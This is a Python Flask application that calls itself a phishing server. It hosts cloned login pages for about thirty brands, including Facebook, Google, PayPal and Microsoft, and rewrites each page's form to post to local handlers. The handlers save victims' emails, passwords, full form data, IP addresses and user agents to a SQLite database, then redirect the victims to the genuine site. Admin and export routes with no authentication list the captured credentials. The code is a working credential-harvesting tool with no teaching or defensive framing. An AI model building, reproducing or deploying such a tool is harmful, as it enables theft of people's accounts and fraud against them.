#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from flask import Flask, render_template, request, redirect, url_for, send_from_directory, jsonify, send_file
import os
import json
import datetime
from urllib.parse import urlparse
import sqlite3
import threading
import time
import socket
import signal
import sys
from threading import Thread
import webbrowser

app = Flask(__name__)
app.secret_key = 'phishing_server_secret_key_2024'

# Configuración
SITES_DIR = 'sites'
LOGOS_DIR = 'logos'
CREDENTIALS_DB = 'credentials.db'
STATIC_FILES = ['css', 'js', 'png', 'jpg', 'jpeg', 'gif', 'svg', 'ico', 'woff', 'woff2', 'ttf', 'eot']
BASE_PORT = 5001  # Puerto base para sitios desplegados
deployed_sites = {}  # Diccionario para trackear sitios desplegados

# Lock para thread safety
db_lock = threading.Lock()

class DatabaseManager:
    def __init__(self, db_path):
        self.db_path = db_path
        self.init_database()
    
    def init_database(self):
        """Inicializa la base de datos y crea las tablas necesarias"""
        with db_lock:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS credentials (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    site_name TEXT NOT NULL,
                    email TEXT,
                    password TEXT,
                    extra_data TEXT,
                    ip_address TEXT,
                    user_agent TEXT,
                    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS site_visits (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    site_name TEXT NOT NULL,
                    ip_address TEXT,
                    user_agent TEXT,
                    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            
            conn.commit()
            conn.close()
    
    def save_credentials(self, site_name, email=None, password=None, extra_data=None, ip_address=None, user_agent=None):
        """Guarda las credenciales en la base de datos"""
        with db_lock:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            cursor.execute('''
                INSERT INTO credentials (site_name, email, password, extra_data, ip_address, user_agent)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (site_name, email, password, extra_data, ip_address, user_agent))
            
            conn.commit()
            conn.close()
    
    def log_visit(self, site_name, ip_address=None, user_agent=None):
        """Registra una visita al sitio"""
        with db_lock:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            cursor.execute('''
                INSERT INTO site_visits (site_name, ip_address, user_agent)
                VALUES (?, ?, ?)
            ''', (site_name, ip_address, user_agent))
            
            conn.commit()
            conn.close()
    
    def get_all_credentials(self):
        """Obtiene todas las credenciales"""
        with db_lock:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            cursor.execute('''
                SELECT id, site_name, email, password, extra_data, ip_address, user_agent, timestamp
                FROM credentials
                ORDER BY timestamp DESC
            ''')
            
            results = cursor.fetchall()
            conn.close()
            
            return [dict(zip([col[0] for col in cursor.description], row)) for row in results]
    
    def get_credentials_by_site(self, site_name):
        """Obtiene credenciales filtradas por sitio"""
        with db_lock:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            cursor.execute('''
                SELECT id, site_name, email, password, extra_data, ip_address, user_agent, timestamp
                FROM credentials
                WHERE site_name = ?
                ORDER BY timestamp DESC
            ''', (site_name,))
            
            results = cursor.fetchall()
            conn.close()
            
            return [dict(zip([col[0] for col in cursor.description], row)) for row in results]

# Inicializar el gestor de base de datos
db_manager = DatabaseManager(CREDENTIALS_DB)

def get_available_sites():
    """Obtiene la lista de sitios disponibles con información de logos"""
    sites = []
    if os.path.exists(SITES_DIR):
        for item in os.listdir(SITES_DIR):
            site_path = os.path.join(SITES_DIR, item)
            if os.path.isdir(site_path):
                # Buscar logo correspondiente
                logo = get_site_logo(item)
                sites.append({
                    'name': item,
                    'display_name': item.replace('-', ' ').replace('_', ' ').title(),
                    'logo': logo,
                    'deployed': item in deployed_sites,
                    'port': deployed_sites.get(item, {}).get('port', None),
                    'url': f"http://localhost:{deployed_sites.get(item, {}).get('port', 'XXXX')}" if item in deployed_sites else None
                })
    return sorted(sites, key=lambda x: x['name'])

def get_site_logo(site_name):
    """Busca el logo correspondiente al sitio"""
    if not os.path.exists(LOGOS_DIR):
        return None
    
    # Mapeo de nombres de sitios a archivos de logo
    logo_mappings = {
        'facebook': 'facebook.jpg',
        'facebook-security': 'facebook.jpg',
        'google': 'google.jpg', 
        'google-new': 'google.jpg',
        'instagram': 'insta2.png',
        'instagram-follow': 'insta2.png',
        'instagram-security': 'instagram-security.jpg',
        'instafollowers': 'insta2.png',
        'github': 'github.jpg',
        'gitlab': 'gitlab.jpg',
        'linkedin': 'linkedin.jpg',
        'twitter': 'twitetr.png',
        'netflix': 'netflix.png',
        'spotify': 'spotify.jpg',
        'paypal': 'paypal.jpeg',
        'microsoft': 'microsoft.jpg',
        'adobe': 'adobe.jpg',
        'dropbox': 'dropbox.png',
        'ebay': 'ebay.png',
        'mediafire': 'mediafire.jpg',
        'messanger': 'messanger.png',
        'origin': 'Orign.jpg',
        'playstation': 'playstation.jpg',
        'protonmail': 'proton.jpg',
        'snapchat': 'snapchat.png',
        'steam': 'steam.png',
        'tiktok': 'tiktok.png',
        'wordpress': 'wordpress.png',
        'yahoo': 'yahoo.jpg',
        'yandex': 'yandex.png'
    }
    
    logo_file = logo_mappings.get(site_name)
    if logo_file and os.path.exists(os.path.join(LOGOS_DIR, logo_file)):
        return f'/logos/{logo_file}'
    
    return None

def find_free_port(start_port=5001):
    """Encuentra un puerto libre para desplegar el sitio"""
    port = start_port
    while port < 6000:  # Limitar rango de puertos
        if port not in [site_info['port'] for site_info in deployed_sites.values()]:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.bind(('localhost', port))
                    return port
            except OSError:
                pass
        port += 1
    return None

def create_site_app(site_name, port):
    """Crea una aplicación Flask independiente para un sitio específico"""
    site_app = Flask(f'site_{site_name}')
    site_app.secret_key = f'site_{site_name}_secret'
    
    site_info = get_site_info(site_name)
    if not site_info:
        return None
    
    @site_app.route('/')
    @site_app.route('/<filename>')
    def serve_file(filename='index.php'):
        # Si no se especifica archivo, usar index por defecto
        if not filename or filename == '':
            if site_info['has_index']:
                filename = 'index.php'
            elif site_info['has_login']:
                filename = 'login.html'
            else:
                return f"Sitio {site_name} desplegado correctamente"
        
        file_path = os.path.join(site_info['path'], filename)
        
        if not os.path.exists(file_path):
            return f"Archivo '{filename}' no encontrado", 404
        
        # Verificar si es un archivo estático
        file_ext = filename.split('.')[-1].lower()
        if file_ext in STATIC_FILES:
            return send_from_directory(site_info['path'], filename)
        
        # Para archivos HTML/PHP, leer y procesar el contenido
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            # Procesar contenido para actualizar rutas y formularios
            content = process_site_content_standalone(content, site_name, filename, port)
            
            # Determinar el content type
            if filename.endswith('.html') or filename.endswith('.php'):
                return content, 200, {'Content-Type': 'text/html; charset=utf-8'}
            else:
                return content
        
        except Exception as e:
            return f"Error al cargar archivo: {str(e)}", 500
    
    @site_app.route('/login.php', methods=['POST'])
    @site_app.route('/login', methods=['POST']) 
    def handle_standalone_login():
        """Maneja el envío de formularios de login en el sitio independiente"""
        try:
            # Obtener datos del formulario
            form_data = request.form.to_dict()
            
            # Extraer credenciales comunes
            email = form_data.get('email') or form_data.get('username') or form_data.get('user') or form_data.get('login')
            password = form_data.get('pass') or form_data.get('password') or form_data.get('passwd')
            
            # Datos adicionales como JSON
            extra_data = json.dumps(form_data) if form_data else None
            
            # Guardar en la base de datos
            db_manager.save_credentials(
                site_name=site_name,
                email=email,
                password=password,
                extra_data=extra_data,
                ip_address=request.environ.get('HTTP_X_REAL_IP', request.remote_addr),
                user_agent=request.headers.get('User-Agent')
            )
            
            # Determinar URL de redirección basada en el sitio
            redirect_urls = {
                'facebook': 'https://facebook.com/',
                'google': 'https://accounts.google.com/',
                'instagram': 'https://instagram.com/',
                'github': 'https://github.com/',
                'linkedin': 'https://linkedin.com/',
                'twitter': 'https://twitter.com/',
                'netflix': 'https://netflix.com/',
                'spotify': 'https://spotify.com/',
                'paypal': 'https://paypal.com/',
                'microsoft': 'https://microsoft.com/',
            }
            
            redirect_url = redirect_urls.get(site_name, f'https://{site_name}.com/')
            return redirect(redirect_url)
        
        except Exception as e:
            return f"Error procesando login: {str(e)}", 500
    
    return site_app

def process_site_content_standalone(content, site_name, filename, port):
    """Procesa el contenido del sitio para el servidor independiente"""
    try:
        # Actualizar action de formularios para que apunten al servidor local
        content = content.replace('action="login.php"', f'action="http://localhost:{port}/login.php"')
        content = content.replace("action='login.php'", f"action='http://localhost:{port}/login.php'")
        content = content.replace('action="login"', f'action="http://localhost:{port}/login"')
        
        # Actualizar enlaces relativos para el servidor independiente
        content = content.replace('href="login.html"', f'href="http://localhost:{port}/login.html"')
        content = content.replace('href="index.php"', f'href="http://localhost:{port}/"')
        content = content.replace('href="mobile.html"', f'href="http://localhost:{port}/mobile.html"')
        
        # Actualizar includes PHP
        content = content.replace("include 'ip.php'", "")
        content = content.replace('include "ip.php"', "")
        
        # Para archivos PHP, comentar el código PHP que no necesitamos
        if filename.endswith('.php'):
            content = content.replace("header('Location:", "// header('Location:")
            content = content.replace('header("Location:', '// header("Location:')
            content = content.replace("exit();", "// exit();")
        
        return content
    
    except Exception as e:
        print(f"Error procesando contenido: {e}")
        return content

def deploy_site_process(site_name, port):
    """Despliega un sitio en un proceso separado"""
    try:
        site_app = create_site_app(site_name, port)
        if site_app:
            print(f"Desplegando {site_name} en puerto {port}")
            site_app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
    except Exception as e:
        print(f"Error desplegando {site_name}: {e}")

@app.route('/logos/<filename>')
def serve_logo(filename):
    """Sirve los logos de los sitios"""
    return send_from_directory(LOGOS_DIR, filename)

def get_site_info(site_name):
    """Obtiene información sobre un sitio específico"""
    site_path = os.path.join(SITES_DIR, site_name)
    if not os.path.exists(site_path):
        return None
    
    info = {
        'name': site_name,
        'path': site_path,
        'files': [],
        'has_index': False,
        'has_login': False,
        'has_mobile': False
    }
    
    try:
        for file in os.listdir(site_path):
            info['files'].append(file)
            if file == 'index.php' or file == 'index.html':
                info['has_index'] = True
            elif file == 'login.php' or file == 'login.html':
                info['has_login'] = True
            elif file == 'mobile.html':
                info['has_mobile'] = True
    except:
        pass
    
    return info

@app.route('/')
def index():
    """Página principal - selector de sitios"""
    sites = get_available_sites()
    return render_template('index.html', sites=sites)

@app.route('/admin')
def admin():
    """Panel de administración"""
    credentials = db_manager.get_all_credentials()
    sites = [site['name'] for site in get_available_sites()]
    return render_template('admin.html', credentials=credentials, sites=sites)

@app.route('/admin/credentials/<site_name>')
def admin_site_credentials(site_name):
    """Ver credenciales de un sitio específico"""
    credentials = db_manager.get_credentials_by_site(site_name)
    return jsonify(credentials)

@app.route('/admin/export')
def export_credentials():
    """Exportar todas las credenciales como JSON"""
    credentials = db_manager.get_all_credentials()
    return jsonify(credentials)

@app.route('/deploy/<site_name>')
def deploy_site(site_name):
    """Despliega un sitio específico en un puerto independiente"""
    site_info = get_site_info(site_name)
    if not site_info:
        return f"Sitio '{site_name}' no encontrado", 404
    
    # Verificar si ya está desplegado
    if site_name in deployed_sites:
        return redirect(url_for('site_status', site_name=site_name))
    
    # Encontrar puerto libre
    port = find_free_port()
    if not port:
        return "No hay puertos disponibles para desplegar el sitio", 500
    
    try:
        # Crear proceso independiente para el sitio
        process = Process(target=deploy_site_process, args=(site_name, port))
        process.start()
        
        # Registrar el sitio desplegado
        deployed_sites[site_name] = {
            'port': port,
            'process': process,
            'start_time': datetime.datetime.now(),
            'url': f'http://localhost:{port}'
        }
        
        # Registrar la visita
        db_manager.log_visit(
            site_name=site_name,
            ip_address=request.environ.get('HTTP_X_REAL_IP', request.remote_addr),
            user_agent=request.headers.get('User-Agent')
        )
        
        # Esperar un momento para que el servidor se inicie
        time.sleep(2)
        
        return redirect(url_for('site_status', site_name=site_name))
    
    except Exception as e:
        return f"Error desplegando sitio: {str(e)}", 500

@app.route('/site-status/<site_name>')
def site_status(site_name):
    """Muestra el estado del sitio desplegado"""
    if site_name not in deployed_sites:
        return redirect(url_for('index'))
    
    site_data = deployed_sites[site_name]
    return render_template('site_status.html', 
                         site_name=site_name, 
                         site_data=site_data)

@app.route('/stop/<site_name>')
def stop_site(site_name):
    """Detiene un sitio desplegado"""
    if site_name in deployed_sites:
        try:
            process = deployed_sites[site_name]['process']
            process.terminate()
            process.join(timeout=5)
            if process.is_alive():
                process.kill()
            del deployed_sites[site_name]
            return redirect(url_for('index'))
        except Exception as e:
            return f"Error deteniendo sitio: {str(e)}", 500
    return redirect(url_for('index'))

@app.route('/deployed-sites')
def deployed_sites_status():
    """API para obtener estado de sitios desplegados"""
    status = {}
    for site_name, site_data in deployed_sites.items():
        status[site_name] = {
            'port': site_data['port'],
            'url': site_data['url'],
            'start_time': site_data['start_time'].isoformat(),
            'running': site_data['process'].is_alive()
        }
    return jsonify(status)

@app.route('/site/<site_name>/')
@app.route('/site/<site_name>/<filename>')
def serve_site_file(site_name, filename='index.php'):
    """Sirve archivos específicos de un sitio"""
    site_info = get_site_info(site_name)
    if not site_info:
        return f"Sitio '{site_name}' no encontrado", 404
    
    # Si no se especifica archivo, usar index por defecto
    if not filename:
        if site_info['has_index']:
            filename = 'index.php'
        elif site_info['has_login']:
            filename = 'login.html'
        else:
            return f"No se encontró archivo principal para el sitio '{site_name}'"
    
    file_path = os.path.join(site_info['path'], filename)
    
    if not os.path.exists(file_path):
        return f"Archivo '{filename}' no encontrado en sitio '{site_name}'", 404
    
    # Verificar si es un archivo estático
    file_ext = filename.split('.')[-1].lower()
    if file_ext in STATIC_FILES:
        return send_from_directory(site_info['path'], filename)
    
    # Para archivos HTML/PHP, leer y procesar el contenido
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        
        # Procesar contenido para actualizar rutas y formularios
        content = process_site_content(content, site_name, filename)
        
        # Determinar el content type
        if filename.endswith('.html') or filename.endswith('.php'):
            return content, 200, {'Content-Type': 'text/html; charset=utf-8'}
        else:
            return content
    
    except Exception as e:
        return f"Error al cargar archivo: {str(e)}", 500

@app.route('/site/<site_name>/login.php', methods=['POST'])
@app.route('/site/<site_name>/login', methods=['POST'])
def handle_login(site_name):
    """Maneja el envío de formularios de login"""
    try:
        # Obtener datos del formulario
        form_data = request.form.to_dict()
        
        # Extraer credenciales comunes
        email = form_data.get('email') or form_data.get('username') or form_data.get('user') or form_data.get('login')
        password = form_data.get('pass') or form_data.get('password') or form_data.get('passwd')
        
        # Datos adicionales como JSON
        extra_data = json.dumps(form_data) if form_data else None
        
        # Guardar en la base de datos
        db_manager.save_credentials(
            site_name=site_name,
            email=email,
            password=password,
            extra_data=extra_data,
            ip_address=request.environ.get('HTTP_X_REAL_IP', request.remote_addr),
            user_agent=request.headers.get('User-Agent')
        )
        
        # Determinar URL de redirección basada en el sitio
        redirect_urls = {
            'facebook': 'https://facebook.com/',
            'google': 'https://accounts.google.com/',
            'instagram': 'https://instagram.com/',
            'github': 'https://github.com/',
            'linkedin': 'https://linkedin.com/',
            'twitter': 'https://twitter.com/',
            'netflix': 'https://netflix.com/',
            'spotify': 'https://spotify.com/',
            'paypal': 'https://paypal.com/',
            'microsoft': 'https://microsoft.com/',
        }
        
        redirect_url = redirect_urls.get(site_name, f'https://{site_name}.com/')
        return redirect(redirect_url)
    
    except Exception as e:
        return f"Error procesando login: {str(e)}", 500

def process_site_content(content, site_name, filename):
    """Procesa el contenido del sitio para actualizar rutas y formularios"""
    try:
        # Actualizar action de formularios para que apunten a nuestro handler
        content = content.replace('action="login.php"', f'action="/site/{site_name}/login.php"')
        content = content.replace("action='login.php'", f"action='/site/{site_name}/login.php'")
        
        # Actualizar enlaces relativos
        content = content.replace('href="login.html"', f'href="/site/{site_name}/login.html"')
        content = content.replace('href="index.php"', f'href="/site/{site_name}/index.php"')
        content = content.replace('href="mobile.html"', f'href="/site/{site_name}/mobile.html"')
        
        # Actualizar includes PHP (aunque no los procesaremos realmente)
        content = content.replace("include 'ip.php'", "")
        content = content.replace('include "ip.php"', "")
        
        # Para archivos PHP, comentar el código PHP que no necesitamos
        if filename.endswith('.php'):
            # Comentar header redirects para evitar redirecciones inmediatas
            content = content.replace("header('Location:", "// header('Location:")
            content = content.replace('header("Location:', '// header("Location:')
            content = content.replace("exit();", "// exit();")
        
        return content
    
    except Exception as e:
        print(f"Error procesando contenido: {e}")
        return content

# Rutas para servir archivos estáticos de sitios
@app.route('/site/<site_name>/static/<path:filename>')
def serve_static(site_name, filename):
    """Sirve archivos estáticos de los sitios"""
    site_info = get_site_info(site_name)
    if site_info:
        return send_from_directory(site_info['path'], filename)
    return "Archivo no encontrado", 404

def cleanup_deployed_sites():
    """Limpia todos los sitios desplegados al cerrar"""
    for site_name, site_data in deployed_sites.items():
        try:
            process = site_data['process']
            if process.is_alive():
                process.terminate()
                process.join(timeout=3)
                if process.is_alive():
                    process.kill()
        except:
            pass

def signal_handler(sig, frame):
    """Maneja la señal de cierre del programa"""
    print("\n\n🛑 Cerrando servidor y sitios desplegados...")
    cleanup_deployed_sites()
    sys.exit(0)

if __name__ == '__main__':
    # Registrar manejador de señales para limpieza
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    # Crear directorio de templates si no existe
    if not os.path.exists('templates'):
        os.makedirs('templates')
    
    print("=== SERVIDOR DE PHISHING FLASK ===")
    print(f"Sitios disponibles: {len([s['name'] for s in get_available_sites()])}")
    print("Iniciando servidor en http://localhost:5000")
    print("Panel de administración: http://localhost:5000/admin")
    print("Ctrl+C para detener")
    print("\n🎯 FUNCIONALIDADES:")
    print("  • Despliegue independiente por puerto")
    print("  • Logos automáticos de sitios")
    print("  • Captura completa de credenciales")
    print("  • Panel de administración en tiempo real")
    print("")
    
    try:
        app.run(debug=True, host='0.0.0.0', port=5000)
    except KeyboardInterrupt:
        cleanup_deployed_sites()
    except Exception as e:
        print(f"Error: {e}")
        cleanup_deployed_sites()
